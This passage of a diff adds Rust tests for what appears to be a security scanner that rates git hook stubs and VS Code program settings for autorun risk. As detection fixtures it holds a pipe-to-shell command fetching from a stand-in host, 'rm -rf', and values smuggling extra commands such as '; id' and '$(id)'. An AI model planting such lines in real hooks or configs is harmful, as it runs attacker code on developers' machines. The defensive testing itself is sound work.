+            "/usr/bin/evil",
+            "/proc/self/cwd/python",
+            "/dev/shm/python",
+            "/tmp/x/python3",
+            "/usr/bin/../../tmp/python",
+            "'./python'",
+        ] {
+            let stub = PRE_COMMIT_STUB.replace("/usr/bin/python3", python);
+            assert!(!low(&stub), "{python}");
+        }
+        let with_args = |args: &str| {
+            PRE_COMMIT_STUB.replace(
+                "ARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)",
+                &format!("ARGS=({args})"),
+            )
+        };
+        assert!(low(&with_args(
+            "hook-impl --config=.pre-commit-config.yaml --hook-type=pre-push"
+        )));
+        assert!(low(&with_args(
+            "hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit --skip-on-missing-config"
+        )));
+        for args in [
+            "hook-impl --config=evil.yaml --hook-type=pre-commit",
+            "hook-impl --config=sub/.pre-commit-config.yaml --hook-type=pre-commit",
+            "hook-impl --config=../.pre-commit-config.yaml --hook-type=pre-commit",
+            "hook-impl --hook-type=pre-commit",
+            "hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit --verbose",
+        ] {
+            assert!(!low(&with_args(args)), "{args}");
+        }
+    }
+
+    #[test]
+    fn a_lefthook_stub_with_inline_code_is_high() {
+        for line in [
+            "node -e \"require('fs')\"",
+            "python3 -c \"print(1)\"",
+            "python -c 'x'",
+            "perl -e 1",
+            "ruby -e 1",
+            "php -r 1",
+            "sh -c id",
+            "bash -c 'id'",
+            "node --eval 1",
+            "node -r ./x.js",
+            "python3 -m evilmod",
+        ] {
+            let stub = LEFTHOOK_STUB.replace("echo \"Can't find lefthook in PATH\"", line);
+            assert_ne!(stub, LEFTHOOK_STUB);
+            assert_eq!(
+                hook_severity(".git/hooks/pre-commit", &stub),
+                Severity::High,
+                "{line}"
+            );
+        }
+        // The stock stub, and its message, are not touched.
+        assert_eq!(
+            hook_severity(".git/hooks/pre-commit", LEFTHOOK_STUB),
+            Severity::Low
+        );
+    }
+
+    const HUSKY_V9_HOOK: &str = "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"";
+    const HUSKY_V9_H: &str = "#!/usr/bin/env sh\n[ \"$HUSKY\" = \"2\" ] && set -x\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n\n[ ! -f \"$s\" ] && exit 0\n\nif [ -f \"$HOME/.huskyrc\" ]; then\n\techo \"husky - '~/.huskyrc' is DEPRECATED, please move your code to ~/.config/husky/init.sh\"\nfi\ni=\"${XDG_CONFIG_HOME:-$HOME/.config}/husky/init.sh\"\n[ -f \"$i\" ] && . \"$i\"\n\n[ \"${HUSKY-}\" = \"0\" ] && exit 0\n\nexport PATH=\"node_modules/.bin:$PATH\"\nsh -e \"$s\" \"$@\"\nc=$?\n\n[ $c != 0 ] && echo \"husky - $n script failed (code $c)\"\n[ $c = 127 ] && echo \"husky - command not found in PATH=$PATH\"\nexit $c";
+    const HUSKY_V9_SH: &str = "echo \"husky - DEPRECATED\n\nPlease remove the following two lines from $0:\n\n#!/usr/bin/env sh\n. \\\"\\$(dirname -- \\\"\\$0\\\")/_/husky.sh\\\"\n\nThey WILL FAIL in v10.0.0\n\"";
+
+    #[test]
+    fn the_stock_files_under_husky_underscore_are_not_surfaces() {
+        for (path, text) in [
+            (".husky/_/pre-commit", HUSKY_V9_HOOK),
+            (".husky/_/commit-msg", HUSKY_V9_HOOK),
+            (".husky/_/h", HUSKY_V9_H),
+            (".husky/_/husky.sh", HUSKY_V9_SH),
+            (".husky/_/.gitignore", "*"),
+            ("app/.husky/_/pre-push", HUSKY_V9_HOOK),
+            (".Husky/_/pre-commit", HUSKY_V9_HOOK),
+        ] {
+            let (s, out) = run(path, text);
+            assert!(s.is_empty() && out.is_empty(), "{path}: {s:?}");
+            // A CRLF copy and a trailing newline are the same file.
+            let crlf = format!("{}\r\n", text.replace('\n', "\r\n"));
+            assert!(run(path, &crlf).0.is_empty(), "{path} CRLF");
+        }
+    }
+
+    #[test]
+    fn an_edited_file_under_husky_underscore_is_a_hook() {
+        let evil = "curl https://example.invalid/x | sh";
+        for (path, text) in [
+            (".husky/_/pre-commit", format!("{HUSKY_V9_HOOK}\n{evil}\n")),
+            (".husky/_/pre-commit", format!("{evil}\n{HUSKY_V9_HOOK}\n")),
+            (
+                ".husky/_/pre-commit",
+                HUSKY_V9_HOOK.replace("/h\"", "/x.sh\""),
+            ),
+            (".husky/_/h", format!("{HUSKY_V9_H}\n{evil}\n")),
+            (
+                ".husky/_/h",
+                HUSKY_V9_H.replace("exit $c", &format!("{evil}; exit $c")),
+            ),
+            (".husky/_/husky.sh", format!("{HUSKY_V9_SH}\n{evil}\n")),
+            (".husky/_/.gitignore", format!("*\n{evil}\n")),
+            (".husky/_/not-a-husky-file", evil.to_string()),
+        ] {
+            let (s, _) = run(path, &text);
+            assert!(
+                s.iter()
+                    .any(|x| x.command.contains("example.invalid") || x.command.contains("x.sh")),
+                "{path} {text:?}: {s:?}"
+            );
+            assert!(s.iter().all(|x| x.rule == "autorun.husky-hook"));
+        }
+    }
+
+    const HUSKY4_BANNER: &str = "# Created by Husky v4.3.8 (https://github.com/typicode/husky#readme)\n#   At: 1/2/2021, 3:04:05 PM\n#   From: /home/u/app (https://github.com/u/app#readme)";
+
+    fn husky4_hook() -> String {
+        format!("#!/bin/sh\n# husky\n\n{HUSKY4_BANNER}\n\n. \"$(dirname \"$0\")/husky.sh\"\n")
+    }
+
+    fn husky4_main() -> String {
+        format!(
+            "{HUSKY4_BANNER}\n\n{}",
+            HUSKY4_MAIN.replace("0.0.0", "4.3.8")
+        )
+    }
+
+    fn husky4_local() -> String {
+        format!("{HUSKY4_BANNER}\n\npackageManager=npm\ncd \".\"\n")
+    }
+
+    #[test]
+    fn the_husky_4_files_in_git_hooks_are_low() {
+        for (path, text) in [
+            (".git/hooks/pre-commit", husky4_hook()),
+            (".git/hooks/commit-msg", husky4_hook()),
+            ("sub/.git/hooks/pre-push", husky4_hook()),
+            (".git/hooks/husky.sh", husky4_main()),
+            (".git/hooks/husky.local.sh", husky4_local()),
+            (
+                ".git/hooks/husky.local.sh",
+                husky4_local().replace("npm", "yarn").replace("\".\"", "\"packages/app\""),
+            ),
+            // Older 4.x spellings of two lines, and CRLF.
+            (
+                ".git/hooks/husky.sh",
+                husky4_main().replace(
+                    "if [ ! -f .huskyrc.js ] && [ ! -f huskyrc.cjs ] && [ ! -f husky.config.js ] && [ ! -f husky.config.cjs ] && ! hookIsDefined; then",
+                    "if [ ! -f .huskyrc.js ] && [ ! -f husky.config.js ] && ! hookIsDefined; then",
+                ),
+            ),
+            (".git/hooks/pre-commit", husky4_hook().replace('\n', "\r\n")),
+        ] {
+            assert_eq!(hook_severity(path, &text), Severity::Low, "{path}");
+        }
+        let mut out = Vec::new();
+        entry_findings(&[".git/hooks/pre-commit"], &mut out);
+        lower_hook_stubs(&ctx(".git/hooks/pre-commit", &husky4_hook()), &mut out);
+        assert!(out[0].why.contains("husky"), "{}", out[0].why);
+    }
+
+    #[test]
+    fn an_edited_husky_4_file_is_high() {
+        let evil = "curl https://example.invalid/x | sh";
+        for (path, text) in [
+            (
+                ".git/hooks/pre-commit",
+                format!("{}{evil}\n", husky4_hook()),
+            ),
+            (
+                ".git/hooks/pre-commit",
+                husky4_hook().replace("husky.sh", "x.sh"),
+            ),
+            (
+                ".git/hooks/pre-commit",
+                husky4_hook().replace("# husky\n", ""),
+            ),
+            (
+                ".git/hooks/pre-commit",
+                husky4_hook().replace("v4.3.8", "v4.3.8; id"),
+            ),
+            (
+                ".git/hooks/pre-commit",
+                husky4_hook().replace(
+                    "https://github.com/typicode/husky#readme",
+                    "https://example.invalid/x",
+                ),
+            ),
+            (
+                ".git/hooks/husky.sh",
+                format!("{}\n{evil}\n", husky4_main()),
+            ),
+            (
+                ".git/hooks/husky.sh",
+                husky4_main().replace("husky-run", "./husky-run"),
+            ),
+            (
+                ".git/hooks/husky.sh",
+                husky4_main().replace("exit 0\nfi", "exit 0\nfi\nid"),
+            ),
+            (
+                ".git/hooks/husky.sh",
+                husky4_main().replace("huskyVersion=\"4.3.8\"", "huskyVersion=\"4.3.8; id\""),
+            ),
+            (
+                ".git/hooks/husky.local.sh",
+                format!("{}{evil}\n", husky4_local()),
+            ),
+            (
+                ".git/hooks/husky.local.sh",
+                husky4_local().replace("npm", "npm; id"),
+            ),
+            (
+                ".git/hooks/husky.local.sh",
+                husky4_local().replace("\".\"", "\"$(id)\""),
+            ),
+            // The husky.sh stock text is not a hook of any other name.
+            (".git/hooks/post-merge.sh", husky4_main()),
+        ] {
+            assert_eq!(
+                hook_severity(path, &text),
+                Severity::High,
+                "{path} {text:?}"
+            );
+        }
+    }
+
+    const SGH_PRELUDE: &str = "#!/bin/sh\n\nif [ \"$SKIP_SIMPLE_GIT_HOOKS\" = \"1\" ]; then\n    echo \"[INFO] SKIP_SIMPLE_GIT_HOOKS is set to 1, skipping hook.\"\n    exit 0\nfi\n\nif [ -f \"$SIMPLE_GIT_HOOKS_RC\" ]; then\n    . \"$SIMPLE_GIT_HOOKS_RC\"\nfi\n\n";
+
+    #[test]
+    fn a_simple_git_hooks_stub_with_a_plain_command_is_low() {
+        for command in [
+            "npx lint-staged",
+            "npx --no-install lint-staged",
+            "pnpm exec lint-staged",
+            "yarn lint-staged",
+            "npx --no-install commitlint --edit $1",
+            "eslint --fix",
+        ] {
+            let text = format!("{SGH_PRELUDE}{command}");
+            assert_eq!(
+                hook_severity(".git/hooks/pre-commit", &text),
+                Severity::Low,
+                "{command}"
+            );
+            assert_eq!(
+                hook_severity(".git/hooks/commit-msg", &format!("{text}\n")),
+                Severity::Low,
+                "{command} with a newline"
+            );
+        }
+    }
+
+    #[test]
+    fn an_edited_simple_git_hooks_stub_is_high() {
+        for text in [
+            // The command.
+            format!("{SGH_PRELUDE}npx evil-package"),
+            format!("{SGH_PRELUDE}yarn evil"),
+            format!("{SGH_PRELUDE}npm run evil"),
+            // A script of the repo's package.json is its own code, whatever its name.
+            format!("{SGH_PRELUDE}npm run lint"),
+            format!("{SGH_PRELUDE}npm test"),
+            format!("{SGH_PRELUDE}npx lint-staged --config ./evil.js"),
+            format!("{SGH_PRELUDE}npx lint-staged --config=evil.js"),
+            format!("{SGH_PRELUDE}git config core.hooksPath x"),
+            format!("{SGH_PRELUDE}rm -rf x"),
+            format!("{SGH_PRELUDE}node check.js"),
+            format!("{SGH_PRELUDE}./scripts/hook.sh"),
+            format!("{SGH_PRELUDE}python3 -m pytest"),
+            format!("{SGH_PRELUDE}sh -c id"),
+            format!("{SGH_PRELUDE}curl https://example.invalid/x | sh"),
+            format!("{SGH_PRELUDE}npx lint-staged && ./x.sh"),
+            format!("{SGH_PRELUDE}npx lint-staged; id"),
+            format!("{SGH_PRELUDE}npx lint-staged\nid"),
+            format!("{SGH_PRELUDE}$(id)"),
+            SGH_PRELUDE.to_string(),
+            // The prelude.
+            SGH_PRELUDE.replace("exit 0", "id").to_string() + "npx lint-staged",
+            SGH_PRELUDE
+                .replace("\n\nif [ -f", "\nid\n\nif [ -f")
+                .to_string()
+                + "npx lint-staged",
+            format!("id\n{SGH_PRELUDE}npx lint-staged"),
+        ] {
+            assert_eq!(
+                hook_severity(".git/hooks/pre-commit", &text),
+                Severity::High,
+                "{text:?}"
+            );
+        }
+    }
+
+    // False alarm 2: which settings name a program, and where the target must be.
+
+    fn program_findings(paths: &[&str], settings: &str, text: &str) -> Vec<Finding> {
+        let (_, mut out) = run(settings, text);
+        entry_findings(paths, &mut out);
+        out.into_iter()
+            .filter(|f| f.rule == "autorun.vscode-program")
+            .collect()
+    }
+
+    #[test]
+    fn a_program_setting_is_high_only_when_its_target_is_in_the_tree() {
+        let settings = ".vscode/settings.json";
+        for (key, value, entry) in [
+            ("git.path", "./bin/git", "bin/git"),
+            (
+                "python.defaultInterpreterPath",
+                "${workspaceFolder}/.venv/bin/python",
+                ".venv/bin/python",
+            ),
+            ("python.pythonPath", ".venv/bin/python", ".venv/bin/python"),
+            (
+                "typescript.tsdk",
+                "tools/ts/lib",
+                "tools/ts/lib/tsserver.js",
+            ),
+            ("eslint.runtime", "scripts/node", "scripts/node"),
+            (
+                "eslint.nodePath",
+                "./tools",
+                "tools/node_modules/x/index.js",
+            ),
+            ("rust-analyzer.server.path", "./ra", "ra"),
+            ("php.validate.executablePath", "./php", "php"),
+            ("some.ext.executablePath", "./bin/x", "bin/x"),
+            ("some.ext.serverPath", "./srv", "srv"),
+            ("terminal.integrated.shell.linux", "./sh", "sh"),
+            // The entry is found without regard to case.
+            ("git.path", "./bin/git", "Bin/Git"),
+        ] {
+            let text = format!("{{\"{key}\": \"{value}\"}}");
+            let present = program_findings(&[settings, entry], settings, &text);
+            assert_eq!(present[0].severity, Severity::High, "{key} {value}");
+            let absent = program_findings(&[settings, "README.md"], settings, &text);
+            assert!(absent[0].severity < Severity::High, "{key} {value} absent");
+            assert!(absent[0].severity >= Severity::Low, "{key} {value} absent");
+        }
+        // A folder that only has the target as a prefix of another name is not it.
+        let text = r#"{"git.path": "./bin/git"}"#;
+        let near = program_findings(&[settings, "bin/gitx"], settings, text);
+        assert!(near[0].severity < Severity::High);
+    }
+
+    #[test]
+    fn a_program_setting_in_a_workspace_file_is_read_from_the_workspace_folder() {
+        let text = r#"{"settings": {"git.path": "./bin/git"}}"#;
+        let found = program_findings(
+            &["app/dev.code-workspace", "app/bin/git"],
+            "app/dev.code-workspace",
+            text,
+        );
+        assert_eq!(found[0].severity, Severity::High);
+        let found = program_findings(
+            &["app/dev.code-workspace", "bin/git"],
+            "app/dev.code-workspace",
+            text,
+        );
+        assert!(found[0].severity < Severity::High);
+        // A settings file keeps its target next to the .vscode folder.
+        let text = r#"{"git.path": "./bin/git"}"#;
+        let found = program_findings(
+            &["app/.vscode/settings.json", "app/bin/git"],
+            "app/.vscode/settings.json",
+            text,
+        );
+        assert_eq!(found[0].severity, Severity::High);
+        let found = program_findings(
+            &["app/.vscode/settings.json", "bin/git"],
+            "app/.vscode/settings.json",
+            text,
+        );
+        assert!(found[0].severity < Severity::High);
+    }
+
+    #[test]
+    fn nested_program_settings_are_read() {
+        let settings = ".vscode/settings.json";
+        for text in [
+            r#"{"go.alternateTools": {"go": "./bin/go"}}"#,
+            r#"{"terminal.integrated.profiles.linux": {"mine": {"path": "./bin/sh", "args": ["-l"]}}}"#,
+            r#"{"terminal.integrated.profiles.osx": {"mine": {"path": ["/nope", "./bin/sh"]}}}"#,
+        ] {
+            let found = program_findings(&[settings, "bin/go", "bin/sh"], settings, text);
+            assert_eq!(found[0].severity, Severity::High, "{text}");
+            let found = program_findings(&[settings], settings, text);
+            assert!(found[0].severity < Severity::High, "{text} absent");
+        }
+        // A profile path outside the repo.
+        let text = r#"{"terminal.integrated.profiles.linux": {"zsh": {"path": "/usr/bin/zsh"}}}"#;
+        let found = program_findings(&[settings, "usr/bin/zsh"], settings, text);
+        assert_eq!(found[0].severity, Severity::Medium);
+    }
+
+    #[test]
+    fn a_target_outside_the_repo_stays_medium_whether_or_not_it_is_in_the_tree() {
+        let settings = ".vscode/settings.json";
+        for value in [
+            "/usr/bin/git",
+            "~/bin/git",
+            "../bin/git",
+            "./../bin/git",
+            "./a/../../bin/git",
+            "node_modules/.bin/git",
+            "${userHome}/git",
+        ] {
+            let text = format!("{{\"git.path\": \"{value}\"}}");
+            let found = program_findings(
+                &[settings, "bin/git", "usr/bin/git", "node_modules/.bin/git"],
+                settings,
+                &text,
+            );
+            assert_eq!(found[0].severity, Severity::Medium, "{value}");
+        }
+        // `..` that stays inside the repo is a target in the repo.
+        let text = r#"{"git.path": "./a/../bin/git"}"#;
+        let found = program_findings(&[settings, "bin/git"], settings, text);
+        assert_eq!(found[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn keys_that_are_not_programs_are_not_rated() {
+        // Config, ignore, stub and venv path keys name data, not a program.
+        let settings = ".vscode/settings.json";
+        let text = r#"{
+  "python.venvPath": "./venvs",
+  "python.analysis.stubPath": "./typings",
+  "python.analysis.extraPaths": ["./src"],
+  "mypy-type-checker.ignorePatterns": ["./x"],
+  "ruff.configuration": "./ruff.toml",
+  "eslint.options": {"overrideConfigFile": "./x.json"},
+  "eslint.workingDirectories": ["./app"],
+  "prettier.configPath": "./.prettierrc",
+  "prettier.ignorePath": "./.prettierignore",
+  "black-formatter.path": ["./bin/black"],
+  "cmake.configurePath": "./build",
+  "java.jdt.ls.vmargs": "./x",
+  "myext.path": "./x"
+}"#;
+        let found = program_findings(
+            &[
+                settings,
+                "venvs/x",
+                "typings/x",
+                "src/x",
+                "ruff.toml",
+                "x.json",
+                "bin/black",
+                "build/x",
+            ],
+            settings,
+            text,
+        );
+        assert!(found.is_empty(), "{found:?}");
+        // A bare name is on PATH, not in the repo.
+        let found = program_findings(&[settings, "git"], settings, r#"{"git.path": "git"}"#);
+        assert!(found.is_empty());
+    }
+
+    #[test]
+    fn the_vscode_hidden_check_is_not_changed_by_the_tree() {
+        let settings = ".vscode/settings.json";
+        let (_, mut out) = run(settings, r#"{"files.exclude": {"**/.vscode": true}}"#);
+        entry_findings(&[settings], &mut out);
+        assert_eq!(
+            named(&out, "autorun.vscode-hidden").severity,
+            Severity::High
+        );
     }
 
     #[test]
